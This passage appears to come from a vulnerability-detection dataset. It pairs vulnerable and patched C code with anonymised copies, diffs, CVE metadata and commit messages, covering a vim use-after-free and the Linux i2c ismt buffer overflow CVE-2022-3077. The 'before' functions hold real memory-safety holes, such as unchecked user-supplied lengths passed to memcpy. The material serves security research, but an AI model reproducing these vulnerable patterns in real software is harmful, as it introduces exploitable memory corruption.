nv_put_opt(VAR_0, TRUE);
}
else if (VAR_0->nchar == '\'' || VAR_0->nchar == '`')
{
VAR_2 = &VAR_7->w_cursor;
for (VAR_5 = VAR_0->count1; VAR_5 > 0; --VAR_5)
{
VAR_1 = *VAR_2;
VAR_2 = getnextmark(VAR_2, VAR_0->cmdchar == '[' ? VAR_27 : VAR_20,
VAR_0->nchar == '\'');
if (VAR_2 == NULL)
break;
}
if (VAR_2 == NULL)
VAR_2 = &VAR_1;
nv_cursormark(VAR_0, VAR_0->nchar == '\'', VAR_2);
}
else if (VAR_0->nchar >= VAR_28 && VAR_0->nchar <= VAR_29)
{
(void)do_mouse(VAR_0->oap, VAR_0->nchar,
(VAR_0->cmdchar == ']') ? VAR_20 : VAR_27,
VAR_0->count1, VAR_30);
}
#ifdef VAR_23
else if (cap->VAR_31 == 'VAR_32')
{
if (foldMoveTo(FALSE, cap->cmdchar == ']' ? VAR_20 : VAR_27,
cap->count1) == VAR_33)
clearopbeep(cap->oap);
}
#endif
#ifdef VAR_34
else if (cap->VAR_31 == 'VAR_35')
{
if (diff_move_to(cap->cmdchar == ']' ? VAR_20 : VAR_27,
cap->count1) == VAR_33)
clearopbeep(cap->oap);
}
#endif
#ifdef VAR_36
else if (cap->VAR_31 == 'VAR_37' || cap->VAR_31 == 'VAR_38')
{
setpcmark();
for (VAR_5 = 0; VAR_5 < cap->count1; ++VAR_5)
if (spell_move_to(VAR_7, cap->cmdchar == ']' ? VAR_20 : VAR_27,
cap->nchar == 's' ? TRUE : FALSE, FALSE, NULL) == 0)
{
clearopbeep(cap->oap);
break;
}
else
VAR_7->w_set_curswant = TRUE;
# ifdef VAR_23
if (cap->oap->op_type == VAR_19 && (VAR_24 & VAR_39) && VAR_26)
foldOpenCursor();
# endif
}
#endif
else
clearopbeep(cap->VAR_40);
}",vim/e2fa213cf571041dbd04ab0329303ffdc980678a/normal.c/vul/before/0.json,"static void
nv_brackets(cmdarg_T *cap)
{
    pos_T	prev_pos;
    pos_T	*pos = NULL;	    // init for GCC
    pos_T	old_pos;	    // cursor position before command
    int		flag;
    long	n;

    cap->oap->motion_type = MCHAR;
    cap->oap->inclusive = FALSE;
    old_pos = curwin->w_cursor;
    curwin->w_cursor.coladd = 0;    // TODO: don't do this for an error.

#ifdef FEAT_SEARCHPATH
    // ""[f"" or ""]f"" : Edit file under the cursor (same as ""gf"")
    if (cap->nchar == 'f')
	nv_gotofile(cap);
    else
#endif

#ifdef FEAT_FIND_ID
    // Find the occurrence(s) of the identifier or define under cursor
    // in current and included files or jump to the first occurrence.
    //
    //			search	     list	    jump
    //		      fwd   bwd    fwd	 bwd	 fwd	bwd
    // identifier     ""]i""  ""[i""   ""]I""  ""[I""	""]^I""  ""[^I""
    // define	      ""]d""  ""[d""   ""]D""  ""[D""	""]^D""  ""[^D""
    if (vim_strchr((char_u *)""iI\011dD\004"", cap->nchar) != NULL)
    {
	char_u	*ptr;
	int	len;

	if ((len = find_ident_under_cursor(&ptr, FIND_IDENT)) == 0)
	    clearop(cap->oap);
	else
	{
	    // Make a copy, if the line was changed it will be freed.
	    ptr = vim_strnsave(ptr, len);
	    if (ptr == NULL)
		return;

	    find_pattern_in_path(ptr, 0, len, TRUE,
		cap->count0 == 0 ? !isupper(cap->nchar) : FALSE,
		((cap->nchar & 0xf) == ('d' & 0xf)) ?  FIND_DEFINE : FIND_ANY,
		cap->count1,
		isupper(cap->nchar) ? ACTION_SHOW_ALL :
			    islower(cap->nchar) ? ACTION_SHOW : ACTION_GOTO,
		cap->cmdchar == ']' ? curwin->w_cursor.lnum + 1 : (linenr_T)1,
		(linenr_T)MAXLNUM);
	    vim_free(ptr);
	    curwin->w_set_curswant = TRUE;
	}
    }
    else
#endif

    // ""[{"", ""[("", ""]}"" or ""])"": go to Nth unclosed '{', '(', '}' or ')'
    // ""[#"", ""]#"": go to start/end of Nth innermost #if..#endif construct.
    // ""[/"", ""[*"", ""]/"", ""]*"": go to Nth comment start/end.
    // ""[m"" or ""]m"" search for prev/next start of (Java) method.
    // ""[M"" or ""]M"" search for prev/next end of (Java) method.
    if (  (cap->cmdchar == '['
		&& vim_strchr((char_u *)""{(*/#mM"", cap->nchar) != NULL)
	    || (cap->cmdchar == ']'
		&& vim_strchr((char_u *)""})*/#mM"", cap->nchar) != NULL))
	nv_bracket_block(cap, &old_pos);

    // ""[["", ""[]"", ""]]"" and ""]["": move to start or end of function
    else if (cap->nchar == '[' || cap->nchar == ']')
    {
	if (cap->nchar == cap->cmdchar)		    // ""]]"" or ""[[""
	    flag = '{';
	else
	    flag = '}';		    // ""]["" or ""[]""

	curwin->w_set_curswant = TRUE;
	// Imitate strange Vi behaviour: When using ""]]"" with an operator
	// we also stop at '}'.
	if (!findpar(&cap->oap->inclusive, cap->arg, cap->count1, flag,
	      (cap->oap->op_type != OP_NOP
				      && cap->arg == FORWARD && flag == '{')))
	    clearopbeep(cap->oap);
	else
	{
	    if (cap->oap->op_type == OP_NOP)
		beginline(BL_WHITE | BL_FIX);
#ifdef FEAT_FOLDING
	    if ((fdo_flags & FDO_BLOCK) && KeyTyped && cap->oap->op_type == OP_NOP)
		foldOpenCursor();
#endif
	}
    }

    // ""[p"", ""[P"", ""]P"" and ""]p"": put with indent adjustment
    else if (cap->nchar == 'p' || cap->nchar == 'P')
    {
	nv_put_opt(cap, TRUE);
    }

    // ""['"", ""[`"", ""]'"" and ""]`"": jump to next mark
    else if (cap->nchar == '\'' || cap->nchar == '`')
    {
	pos = &curwin->w_cursor;
	for (n = cap->count1; n > 0; --n)
	{
	    prev_pos = *pos;
	    pos = getnextmark(pos, cap->cmdchar == '[' ? BACKWARD : FORWARD,
							  cap->nchar == '\'');
	    if (pos == NULL)
		break;
	}
	if (pos == NULL)
	    pos = &prev_pos;
	nv_cursormark(cap, cap->nchar == '\'', pos);
    }

    // [ or ] followed by a middle mouse click: put selected text with
    // indent adjustment.  Any other button just does as usual.
    else if (cap->nchar >= K_RIGHTRELEASE && cap->nchar <= K_LEFTMOUSE)
    {
	(void)do_mouse(cap->oap, cap->nchar,
		       (cap->cmdchar == ']') ? FORWARD : BACKWARD,
		       cap->count1, PUT_FIXINDENT);
    }

#ifdef FEAT_FOLDING
    // ""[z"" and ""]z"": move to start or end of open fold.
    else if (cap->nchar == 'z')
    {
	if (foldMoveTo(FALSE, cap->cmdchar == ']' ? FORWARD : BACKWARD,
							 cap->count1) == FAIL)
	    clearopbeep(cap->oap);
    }
#endif

#ifdef FEAT_DIFF
    // ""[c"" and ""]c"": move to next or previous diff-change.
    else if (cap->nchar == 'c')
    {
	if (diff_move_to(cap->cmdchar == ']' ? FORWARD : BACKWARD,
							 cap->count1) == FAIL)
	    clearopbeep(cap->oap);
    }
#endif

#ifdef FEAT_SPELL
    // ""[s"", ""[S"", ""]s"" and ""]S"": move to next spell error.
    else if (cap->nchar == 's' || cap->nchar == 'S')
    {
	setpcmark();
	for (n = 0; n < cap->count1; ++n)
	    if (spell_move_to(curwin, cap->cmdchar == ']' ? FORWARD : BACKWARD,
			  cap->nchar == 's' ? TRUE : FALSE, FALSE, NULL) == 0)
	    {
		clearopbeep(cap->oap);
		break;
	    }
	    else
		curwin->w_set_curswant = TRUE;
# ifdef FEAT_FOLDING
	if (cap->oap->op_type == OP_NOP && (fdo_flags & FDO_SEARCH) && KeyTyped)
	    foldOpenCursor();
# endif
    }
#endif

    // Not a valid cap->nchar.
    else
	clearopbeep(cap->oap);
}","static void
nv_brackets(cmdarg_T *VAR_0)
{
    pos_T	VAR_1;
    pos_T	*VAR_2 = NULL;	    /* COMMENT_0 */
    pos_T	VAR_3;	    /* COMMENT_1 */
    int		VAR_4;
    long	VAR_5;

    VAR_0->oap->motion_type = VAR_6;
    VAR_0->oap->inclusive = FALSE;
    VAR_3 = VAR_7->w_cursor;
    VAR_7->w_cursor.coladd = 0;    /* COMMENT_2 */

#ifdef VAR_8
    /* COMMENT_3 */
    if (VAR_0->nchar == 'f')
	nv_gotofile(VAR_0);
    else
#endif

#ifdef VAR_9
    /* COMMENT_4 */
    /* COMMENT_5 */
    /* COMMENT_6 */
    /* COMMENT_7 */
    /* COMMENT_8 */
    /* COMMENT_9 */
    /* COMMENT_10 */
    if (vim_strchr((char_u *)""iI\011dD\004"", VAR_0->nchar) != NULL)
    {
	char_u	*VAR_10;
	int	VAR_11;

	if ((VAR_11 = find_ident_under_cursor(&VAR_10, VAR_12)) == 0)
	    clearop(VAR_0->oap);
	else
	{
	    /* COMMENT_11 */
	    VAR_10 = vim_strnsave(VAR_10, VAR_11);
	    if (VAR_10 == NULL)
		return;

	    find_pattern_in_path(VAR_10, 0, VAR_11, TRUE,
		VAR_0->count0 == 0 ? !isupper(VAR_0->nchar) : FALSE,
		((VAR_0->nchar & 0xf) == ('d' & 0xf)) ?  VAR_13 : VAR_14,
		VAR_0->count1,
		isupper(VAR_0->nchar) ? VAR_15 :
			    islower(VAR_0->nchar) ? VAR_16 : VAR_17,
		VAR_0->cmdchar == ']' ? VAR_7->w_cursor.lnum + 1 : (linenr_T)1,
		(linenr_T)VAR_18);
	    vim_free(VAR_10);
	    VAR_7->w_set_curswant = TRUE;
	}
    }
    else
#endif

    /* COMMENT_12 */
    /* COMMENT_13 */
    /* COMMENT_14 */
    /* COMMENT_15 */
    /* COMMENT_16 */
    if (  (VAR_0->cmdchar == '['
		&& vim_strchr((char_u *)""{(*/#mM"", VAR_0->nchar) != NULL)
	    || (VAR_0->cmdchar == ']'
		&& vim_strchr((char_u *)""})*/#mM"", VAR_0->nchar) != NULL))
	nv_bracket_block(VAR_0, &VAR_3);

    /* COMMENT_17 */
    else if (VAR_0->nchar == '[' || VAR_0->nchar == ']')
    {
	if (VAR_0->nchar == VAR_0->cmdchar)		    /* COMMENT_18 */
	    VAR_4 = '{';
	else
	    VAR_4 = '}';		    /* COMMENT_19 */

	VAR_7->w_set_curswant = TRUE;
	/* COMMENT_20 */
	/* COMMENT_21 */
	if (!findpar(&VAR_0->oap->inclusive, VAR_0->arg, VAR_0->count1, VAR_4,
	      (VAR_0->oap->op_type != VAR_19
				      && VAR_0->arg == VAR_20 && VAR_4 == '{')))
	    clearopbeep(VAR_0->oap);
	else
	{
	    if (VAR_0->oap->op_type == VAR_19)
		beginline(VAR_21 | VAR_22);
#ifdef VAR_23
	    if ((VAR_24 & VAR_25) && VAR_26 && VAR_0->oap->op_type == VAR_19)
		foldOpenCursor();
#endif
	}
    }

    /* COMMENT_22 */
    else if (VAR_0->nchar == 'p' || VAR_0->nchar == 'P')
    {
	nv_put_opt(VAR_0, TRUE);
    }

    /* COMMENT_23 */
    else if (VAR_0->nchar == '\'' || VAR_0->nchar == '`')
    {
	VAR_2 = &VAR_7->w_cursor;
	for (VAR_5 = VAR_0->count1; VAR_5 > 0; --VAR_5)
	{
	    VAR_1 = *VAR_2;
	    VAR_2 = getnextmark(VAR_2, VAR_0->cmdchar == '[' ? VAR_27 : VAR_20,
							  VAR_0->nchar == '\'');
	    if (VAR_2 == NULL)
		break;
	}
	if (VAR_2 == NULL)
	    VAR_2 = &VAR_1;
	nv_cursormark(VAR_0, VAR_0->nchar == '\'', VAR_2);
    }

    /* COMMENT_24 */
    /* COMMENT_25 */
    else if (VAR_0->nchar >= VAR_28 && VAR_0->nchar <= VAR_29)
    {
	(void)do_mouse(VAR_0->oap, VAR_0->nchar,
		       (VAR_0->cmdchar == ']') ? VAR_20 : VAR_27,
		       VAR_0->count1, VAR_30);
    }

#ifdef VAR_23
    /* COMMENT_26 */
    else if (cap->VAR_31 == 'VAR_32')
    {
	if (foldMoveTo(FALSE, cap->cmdchar == ']' ? VAR_20 : VAR_27,
							 cap->count1) == VAR_33)
	    clearopbeep(cap->oap);
    }
#endif

#ifdef VAR_34
    /* COMMENT_27 */
    else if (cap->VAR_31 == 'VAR_35')
    {
	if (diff_move_to(cap->cmdchar == ']' ? VAR_20 : VAR_27,
							 cap->count1) == VAR_33)
	    clearopbeep(cap->oap);
    }
#endif

#ifdef VAR_36
    /* COMMENT_28 */
    else if (cap->VAR_31 == 'VAR_37' || cap->VAR_31 == 'VAR_38')
    {
	setpcmark();
	for (VAR_5 = 0; VAR_5 < cap->count1; ++VAR_5)
	    if (spell_move_to(VAR_7, cap->cmdchar == ']' ? VAR_20 : VAR_27,
			  cap->nchar == 's' ? TRUE : FALSE, FALSE, NULL) == 0)
	    {
		clearopbeep(cap->oap);
		break;
	    }
	    else
		VAR_7->w_set_curswant = TRUE;
# ifdef VAR_23
	if (cap->oap->op_type == VAR_19 && (VAR_24 & VAR_39) && VAR_26)
	    foldOpenCursor();
# endif
    }
#endif

    /* COMMENT_29 */
    else
	clearopbeep(cap->VAR_40);
}",vim/e2fa213cf571041dbd04ab0329303ffdc980678a/normal.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -36,6 +36,11 @@
 	    clearop(cap->oap);
 	else
 	{
+	    // Make a copy, if the line was changed it will be freed.
+	    ptr = vim_strnsave(ptr, len);
+	    if (ptr == NULL)
+		return;
+
 	    find_pattern_in_path(ptr, 0, len, TRUE,
 		cap->count0 == 0 ? !isupper(cap->nchar) : FALSE,
 		((cap->nchar & 0xf) == ('d' & 0xf)) ?  FIND_DEFINE : FIND_ANY,
@@ -44,6 +49,7 @@
 			    islower(cap->nchar) ? ACTION_SHOW : ACTION_GOTO,
 		cap->cmdchar == ']' ? curwin->w_cursor.lnum + 1 : (linenr_T)1,
 		(linenr_T)MAXLNUM);
+	    vim_free(ptr);
 	    curwin->w_set_curswant = TRUE;
 	}
     }","{'deleted_lines': [], 'added_lines': ['\t    // Make a copy, if the line was changed it will be freed.', '\t    ptr = vim_strnsave(ptr, len);', '\t    if (ptr == NULL)', '\t\treturn;', '', '\t    vim_free(ptr);']}",True,Use After Free in GitHub repository vim/vim prior to 8.2.,7.8,HIGH,2,valid,2022-05-26T15:32:44Z,4
CVE-2022-3077,['CWE-120'],CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H,1,torvalds/linux,"i2c: ismt: prevent memory corruption in ismt_access()

The ""data->block[0]"" variable comes from the user and is a number
between 0-255.  It needs to be capped to prevent writing beyond the end
of dma_buffer[].

Fixes: 5e9a97b1f449 (""i2c: ismt: Adding support for I2C_SMBUS_BLOCK_PROC_CALL"")
Reported-and-tested-by: Zheyu Ma <zheyuma97@gmail.com>
Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
Reviewed-by: Mika Westerberg <mika.westerberg@linux.intel.com>
Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",690b2549b19563ec5ad53e5c82f6a944d910086e,https://github.com/torvalds/linux/commit/690b2549b19563ec5ad53e5c82f6a944d910086e,drivers/i2c/busses/i2c-ismt.c,ismt_access,"static int ismt_access(struct i2c_adapter *adap, u16 addr,
unsigned short flags, char read_write, u8 command,
int size, union i2c_smbus_data *data)
{
int ret;
unsigned long time_left;
dma_addr_t dma_addr = 0; 
u8 dma_size = 0;
enum dma_data_direction dma_direction = 0;
struct ismt_desc *desc;
struct ismt_priv *priv = i2c_get_adapdata(adap);
struct device *dev = &priv->pci_dev->dev;
u8 *dma_buffer = PTR_ALIGN(&priv->buffer[0], 16);
desc = &priv->hw[priv->head];
memset(priv->buffer, 0, sizeof(priv->buffer));
memset(desc, 0, sizeof(struct ismt_desc));
desc->tgtaddr_rw = ISMT_DESC_ADDR_RW(addr, read_write);
memset(priv->log, 0, ISMT_LOG_ENTRIES * sizeof(u32));
if (likely(pci_dev_msi_enabled(priv->pci_dev)))
desc->control = ISMT_DESC_INT | ISMT_DESC_FAIR;
else
desc->control = ISMT_DESC_FAIR;
if ((flags & I2C_CLIENT_PEC) && (size != I2C_SMBUS_QUICK)
&& (size != I2C_SMBUS_I2C_BLOCK_DATA))
desc->control |= ISMT_DESC_PEC;
switch (size) {
case I2C_SMBUS_QUICK:
dev_dbg(dev, ""I2C_SMBUS_QUICK\n"");
break;
case I2C_SMBUS_BYTE:
if (read_write == I2C_SMBUS_WRITE) {
dev_dbg(dev, ""I2C_SMBUS_BYTE:  WRITE\n"");
desc->control |= ISMT_DESC_CWRL;
desc->wr_len_cmd = command;
} else {
dev_dbg(dev, ""I2C_SMBUS_BYTE:  READ\n"");
dma_size = 1;
dma_direction = DMA_FROM_DEVICE;
desc->rd_len = 1;
}
break;
case I2C_SMBUS_BYTE_DATA:
if (read_write == I2C_SMBUS_WRITE) {
dev_dbg(dev, ""I2C_SMBUS_BYTE_DATA:  WRITE\n"");
desc->wr_len_cmd = 2;
dma_size = 2;
dma_direction = DMA_TO_DEVICE;
dma_buffer[0] = command;
dma_buffer[1] = data->byte;
} else {
dev_dbg(dev, ""I2C_SMBUS_BYTE_DATA:  READ\n"");
desc->control |= ISMT_DESC_CWRL;
desc->wr_len_cmd = command;
desc->rd_len = 1;
dma_size = 1;
dma_direction = DMA_FROM_DEVICE;
}
break;
case I2C_SMBUS_WORD_DATA:
if (read_write == I2C_SMBUS_WRITE) {
dev_dbg(dev, ""I2C_SMBUS_WORD_DATA:  WRITE\n"");
desc->wr_len_cmd = 3;
dma_size = 3;
dma_direction = DMA_TO_DEVICE;
dma_buffer[0] = command;
dma_buffer[1] = data->word & 0xff;
dma_buffer[2] = data->word >> 8;
} else {
dev_dbg(dev, ""I2C_SMBUS_WORD_DATA:  READ\n"");
desc->wr_len_cmd = command;
desc->control |= ISMT_DESC_CWRL;
desc->rd_len = 2;
dma_size = 2;
dma_direction = DMA_FROM_DEVICE;
}
break;
case I2C_SMBUS_PROC_CALL:
dev_dbg(dev, ""I2C_SMBUS_PROC_CALL\n"");
desc->wr_len_cmd = 3;
desc->rd_len = 2;
dma_size = 3;
dma_direction = DMA_BIDIRECTIONAL;
dma_buffer[0] = command;
dma_buffer[1] = data->word & 0xff;
dma_buffer[2] = data->word >> 8;
break;
case I2C_SMBUS_BLOCK_DATA:
if (read_write == I2C_SMBUS_WRITE) {
dev_dbg(dev, ""I2C_SMBUS_BLOCK_DATA:  WRITE\n"");
dma_size = data->block[0] + 1;
dma_direction = DMA_TO_DEVICE;
desc->wr_len_cmd = dma_size;
desc->control |= ISMT_DESC_BLK;
dma_buffer[0] = command;
memcpy(&dma_buffer[1], &data->block[1], dma_size - 1);
} else {
dev_dbg(dev, ""I2C_SMBUS_BLOCK_DATA:  READ\n"");
dma_size = I2C_SMBUS_BLOCK_MAX;
dma_direction = DMA_FROM_DEVICE;
desc->rd_len = dma_size;
desc->wr_len_cmd = command;
desc->control |= (ISMT_DESC_BLK | ISMT_DESC_CWRL);
}
break;
case I2C_SMBUS_BLOCK_PROC_CALL:
dev_dbg(dev, ""I2C_SMBUS_BLOCK_PROC_CALL\n"");
dma_size = I2C_SMBUS_BLOCK_MAX;
desc->tgtaddr_rw = ISMT_DESC_ADDR_RW(addr, 1);
desc->wr_len_cmd = data->block[0] + 1;
desc->rd_len = dma_size;
desc->control |= ISMT_DESC_BLK;
dma_direction = DMA_BIDIRECTIONAL;
dma_buffer[0] = command;
memcpy(&dma_buffer[1], &data->block[1], data->block[0]);
break;
case I2C_SMBUS_I2C_BLOCK_DATA:
if (data->block[0] < 1)
data->block[0] = 1;
if (data->block[0] > I2C_SMBUS_BLOCK_MAX)
data->block[0] = I2C_SMBUS_BLOCK_MAX;
if (read_write == I2C_SMBUS_WRITE) {
dev_dbg(dev, ""I2C_SMBUS_I2C_BLOCK_DATA:  WRITE\n"");
dma_size = data->block[0] + 1;
dma_direction = DMA_TO_DEVICE;
desc->wr_len_cmd = dma_size;
desc->control |= ISMT_DESC_I2C;
dma_buffer[0] = command;
memcpy(&dma_buffer[1], &data->block[1], dma_size - 1);
} else {
dev_dbg(dev, ""I2C_SMBUS_I2C_BLOCK_DATA:  READ\n"");
dma_size = data->block[0];
dma_direction = DMA_FROM_DEVICE;
desc->rd_len = dma_size;
desc->wr_len_cmd = command;
desc->control |= (ISMT_DESC_I2C | ISMT_DESC_CWRL);
desc->tgtaddr_rw = ISMT_DESC_ADDR_RW(addr, 0);
}
break;
default:
dev_err(dev, ""Unsupported transaction %d\n"",
size);
return -EOPNOTSUPP;
}
if (dma_size != 0) {
dev_dbg(dev, "" dev=%p\n"", dev);
dev_dbg(dev, "" data=%p\n"", data);
dev_dbg(dev, "" dma_buffer=%p\n"", dma_buffer);
dev_dbg(dev, "" dma_size=%d\n"", dma_size);
dev_dbg(dev, "" dma_direction=%d\n"", dma_direction);
dma_addr = dma_map_single(dev,
dma_buffer,
dma_size,
dma_direction);
if (dma_mapping_error(dev, dma_addr)) {
dev_err(dev, ""Error in mapping dma buffer %p\n"",
dma_buffer);
return -EIO;
}
dev_dbg(dev, "" dma_addr = %pad\n"", &dma_addr);
desc->dptr_low = lower_32_bits(dma_addr);
desc->dptr_high = upper_32_bits(dma_addr);
}
reinit_completion(&priv->cmp);
ismt_submit_desc(priv);
time_left = wait_for_completion_timeout(&priv->cmp, HZ*1);
if (dma_size != 0)
dma_unmap_single(dev, dma_addr, dma_size, dma_direction);
if (unlikely(!time_left)) {
dev_err(dev, ""completion wait timed out\n"");
ret = -ETIMEDOUT;
goto out;
}
ret = ismt_process_desc(desc, data, priv, size, read_write);
out:
priv->head++;
priv->head %= ISMT_DESC_ENTRIES;
return ret;
}","static int ismt_access(struct i2c_adapter *VAR_0, u16 VAR_1,
unsigned short VAR_2, char VAR_3, u8 VAR_4,
int VAR_5, union i2c_smbus_data *VAR_6)
{
int VAR_7;
unsigned long VAR_8;
dma_addr_t VAR_9 = 0; 
u8 VAR_10 = 0;
enum dma_data_direction VAR_11 = 0;
struct ismt_desc *VAR_12;
struct ismt_priv *VAR_13 = i2c_get_adapdata(VAR_0);
struct device *VAR_14 = &VAR_13->pci_dev->dev;
u8 *VAR_15 = PTR_ALIGN(&VAR_13->buffer[0], 16);
VAR_12 = &VAR_13->hw[VAR_13->head];
memset(VAR_13->buffer, 0, sizeof(VAR_13->buffer));
memset(VAR_12, 0, sizeof(struct ismt_desc));
VAR_12->tgtaddr_rw = ISMT_DESC_ADDR_RW(VAR_1, VAR_3);
memset(VAR_13->log, 0, VAR_16 * sizeof(VAR_17));
if (likely(pci_dev_msi_enabled(VAR_13->pci_dev)))
VAR_12->control = VAR_18 | VAR_19;
else
VAR_12->control = VAR_19;
if ((VAR_2 & VAR_20) && (VAR_5 != VAR_21)
&& (VAR_5 != VAR_22))
VAR_12->control |= VAR_23;
switch (VAR_5) {
case VAR_21:
dev_dbg(VAR_14, ""I2C_SMBUS_QUICK\n"");
break;
case VAR_24:
if (VAR_3 == VAR_25) {
dev_dbg(VAR_14, ""I2C_SMBUS_BYTE:  WRITE\n"");
VAR_12->control |= VAR_26;
VAR_12->wr_len_cmd = VAR_4;
} else {
dev_dbg(VAR_14, ""I2C_SMBUS_BYTE:  READ\n"");
VAR_10 = 1;
VAR_11 = VAR_27;
VAR_12->rd_len = 1;
}
break;
case VAR_28:
if (VAR_3 == VAR_25) {
dev_dbg(VAR_14, ""I2C_SMBUS_BYTE_DATA:  WRITE\n"");
VAR_12->wr_len_cmd = 2;
VAR_10 = 2;
VAR_11 = VAR_29;
VAR_15[0] = VAR_4;
VAR_15[1] = VAR_6->byte;
} else {
dev_dbg(VAR_14, ""I2C_SMBUS_BYTE_DATA:  READ\n"");
VAR_12->control |= VAR_26;
VAR_12->wr_len_cmd = VAR_4;
VAR_12->rd_len = 1;
VAR_10 = 1;
VAR_11 = VAR_27;
}
break;
case VAR_30:
if (VAR_3 == VAR_25) {
dev_dbg(VAR_14, ""I2C_SMBUS_WORD_DATA:  WRITE\n"");
VAR_12->wr_len_cmd = 3;
VAR_10 = 3;
VAR_11 = VAR_29;
VAR_15[0] = VAR_4;
VAR_15[1] = VAR_6->word & 0xff;
VAR_15[2] = VAR_6->word >> 8;
} else {
dev_dbg(VAR_14, ""I2C_SMBUS_WORD_DATA:  READ\n"");
VAR_12->wr_len_cmd = VAR_4;
VAR_12->control |= VAR_26;
VAR_12->rd_len = 2;
VAR_10 = 2;
VAR_11 = VAR_27;
}
break;
case VAR_31:
dev_dbg(VAR_14, ""I2C_SMBUS_PROC_CALL\n"");
VAR_12->wr_len_cmd = 3;
VAR_12->rd_len = 2;
VAR_10 = 3;
VAR_11 = VAR_32;
VAR_15[0] = VAR_4;
VAR_15[1] = VAR_6->word & 0xff;
VAR_15[2] = VAR_6->word >> 8;
break;
case VAR_33:
if (VAR_3 == VAR_25) {
dev_dbg(VAR_14, ""I2C_SMBUS_BLOCK_DATA:  WRITE\n"");
VAR_10 = VAR_6->block[0] + 1;
VAR_11 = VAR_29;
VAR_12->wr_len_cmd = VAR_10;
VAR_12->control |= VAR_34;
VAR_15[0] = VAR_4;
memcpy(&VAR_15[1], &VAR_6->block[1], VAR_10 - 1);
} else {
dev_dbg(VAR_14, ""I2C_SMBUS_BLOCK_DATA:  READ\n"");
VAR_10 = VAR_35;
VAR_11 = VAR_27;
VAR_12->rd_len = VAR_10;
VAR_12->wr_len_cmd = VAR_4;
VAR_12->control |= (VAR_34 | VAR_26);
}
break;
case VAR_36:
dev_dbg(VAR_14, ""I2C_SMBUS_BLOCK_PROC_CALL\n"");
VAR_10 = VAR_35;
VAR_12->tgtaddr_rw = ISMT_DESC_ADDR_RW(VAR_1, 1);
VAR_12->wr_len_cmd = VAR_6->block[0] + 1;
VAR_12->rd_len = VAR_10;
VAR_12->control |= VAR_34;
VAR_11 = VAR_32;
VAR_15[0] = VAR_4;
memcpy(&VAR_15[1], &VAR_6->block[1], VAR_6->block[0]);
break;
case VAR_22:
if (VAR_6->block[0] < 1)
VAR_6->block[0] = 1;
if (VAR_6->block[0] > VAR_35)
VAR_6->block[0] = VAR_35;
if (VAR_3 == VAR_25) {
dev_dbg(VAR_14, ""I2C_SMBUS_I2C_BLOCK_DATA:  WRITE\n"");
VAR_10 = VAR_6->block[0] + 1;
VAR_11 = VAR_29;
VAR_12->wr_len_cmd = VAR_10;
VAR_12->control |= VAR_37;
VAR_15[0] = VAR_4;
memcpy(&VAR_15[1], &VAR_6->block[1], VAR_10 - 1);
} else {
dev_dbg(VAR_14, ""I2C_SMBUS_I2C_BLOCK_DATA:  READ\n"");
VAR_10 = VAR_6->block[0];
VAR_11 = VAR_27;
VAR_12->rd_len = VAR_10;
VAR_12->wr_len_cmd = VAR_4;
VAR_12->control |= (VAR_37 | VAR_26);
VAR_12->tgtaddr_rw = ISMT_DESC_ADDR_RW(VAR_1, 0);
}
break;
default:
dev_err(VAR_14, ""Unsupported transaction %d\n"",
VAR_5);
return -VAR_38;
}
if (VAR_10 != 0) {
dev_dbg(VAR_14, "" dev=%p\n"", VAR_14);
dev_dbg(VAR_14, "" data=%p\n"", VAR_6);
dev_dbg(VAR_14, "" dma_buffer=%p\n"", VAR_15);
dev_dbg(VAR_14, "" dma_size=%d\n"", VAR_10);
dev_dbg(VAR_14, "" dma_direction=%d\n"", VAR_11);
VAR_9 = dma_map_single(VAR_14,
VAR_15,
VAR_10,
VAR_11);
if (dma_mapping_error(VAR_14, VAR_9)) {
dev_err(VAR_14, ""Error in mapping dma buffer %p\n"",
VAR_15);
return -VAR_39;
}
dev_dbg(VAR_14, "" dma_addr = %pad\n"", &VAR_9);
VAR_12->dptr_low = lower_32_bits(VAR_9);
VAR_12->dptr_high = upper_32_bits(VAR_9);
}
reinit_completion(&VAR_13->cmp);
ismt_submit_desc(VAR_13);
VAR_8 = wait_for_completion_timeout(&VAR_13->cmp, VAR_40*1);
if (VAR_10 != 0)
dma_unmap_single(VAR_14, VAR_9, VAR_10, VAR_11);
if (unlikely(!VAR_8)) {
dev_err(VAR_14, ""completion wait timed out\n"");
VAR_7 = -VAR_41;
goto out;
}
VAR_7 = ismt_process_desc(VAR_12, VAR_6, VAR_13, VAR_5, VAR_3);
out:
VAR_13->head++;
VAR_13->head %= VAR_42;
return VAR_7;
}",torvalds/linux/690b2549b19563ec5ad53e5c82f6a944d910086e/i2c-ismt.c/vul/before/0.json,"static int ismt_access(struct i2c_adapter *adap, u16 addr,
		       unsigned short flags, char read_write, u8 command,
		       int size, union i2c_smbus_data *data)
{
	int ret;
	unsigned long time_left;
	dma_addr_t dma_addr = 0; /* address of the data buffer */
	u8 dma_size = 0;
	enum dma_data_direction dma_direction = 0;
	struct ismt_desc *desc;
	struct ismt_priv *priv = i2c_get_adapdata(adap);
	struct device *dev = &priv->pci_dev->dev;
	u8 *dma_buffer = PTR_ALIGN(&priv->buffer[0], 16);

	desc = &priv->hw[priv->head];

	/* Initialize the DMA buffer */
	memset(priv->buffer, 0, sizeof(priv->buffer));

	/* Initialize the descriptor */
	memset(desc, 0, sizeof(struct ismt_desc));
	desc->tgtaddr_rw = ISMT_DESC_ADDR_RW(addr, read_write);

	/* Always clear the log entries */
	memset(priv->log, 0, ISMT_LOG_ENTRIES * sizeof(u32));

	/* Initialize common control bits */
	if (likely(pci_dev_msi_enabled(priv->pci_dev)))
		desc->control = ISMT_DESC_INT | ISMT_DESC_FAIR;
	else
		desc->control = ISMT_DESC_FAIR;

	if ((flags & I2C_CLIENT_PEC) && (size != I2C_SMBUS_QUICK)
	    && (size != I2C_SMBUS_I2C_BLOCK_DATA))
		desc->control |= ISMT_DESC_PEC;

	switch (size) {
	case I2C_SMBUS_QUICK:
		dev_dbg(dev, ""I2C_SMBUS_QUICK\n"");
		break;

	case I2C_SMBUS_BYTE:
		if (read_write == I2C_SMBUS_WRITE) {
			/*
			 * Send Byte
			 * The command field contains the write data
			 */
			dev_dbg(dev, ""I2C_SMBUS_BYTE:  WRITE\n"");
			desc->control |= ISMT_DESC_CWRL;
			desc->wr_len_cmd = command;
		} else {
			/* Receive Byte */
			dev_dbg(dev, ""I2C_SMBUS_BYTE:  READ\n"");
